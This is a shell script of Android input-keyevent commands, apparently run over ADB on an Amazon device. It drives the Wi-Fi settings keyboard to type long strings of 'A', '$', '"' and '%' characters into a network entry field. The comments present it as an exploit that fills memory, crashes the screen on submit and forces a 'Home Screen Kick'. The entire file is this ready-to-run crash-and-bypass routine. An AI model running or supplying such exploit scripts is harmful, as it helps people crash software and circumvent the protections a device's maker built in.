# Start the Network settings (Amazon will re-route this to their Network tab, rather than Android's)
am start -a android.settings.WIFI_SETTINGS

# Unfocus the tab, and hit Select (Puts you to the top network, which doesn't matter for this bug)
input keyevent 61
input keyevent 66

# Manually enter the string (Bunch of 'A', '%', and '$' signs)
input keyevent 20
input keyevent 20
input keyevent 20
input keyevent 66 # Manually go down 3 letters, to Caps Lock, and hit Enter

# Go up to 'A'
input keyevent 19
input keyevent 19
input keyevent 19

# Hit Enter a bunch, until we hit the normal character limit (We have to do this manually, at least in my case)
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66

# Go down to the 'Special Characters' section, and hit Enter (This is the detonator where the actual crash is gonna happen)

input keyevent 20
input keyevent 20
input keyevent 20
input keyevent 22
input keyevent 66

# Once on there, go Up + Right and hit Enter a bunch (string of '$')

input keyevent 19
input keyevent 22

input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66

# Hit Left + Up + Up and hit Enter a bunch (string of "")

input keyevent 21
input keyevent 19
input keyevent 19

input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66

# Hit Right + Enter a bunch (string of '%'), then hit Left to make the next part easier

input keyevent 22

input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66

input keyevent 21

# One last string of '$' (this makes the exploit work)

input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66
input keyevent 66

# Hit 'Submit' to trigger the error, and (if we filled the memory up enough) Home Screen Kick

input keyevent 20
input keyevent 22
input keyevent 22
input keyevent 22
input keyevent 20
input keyevent 66
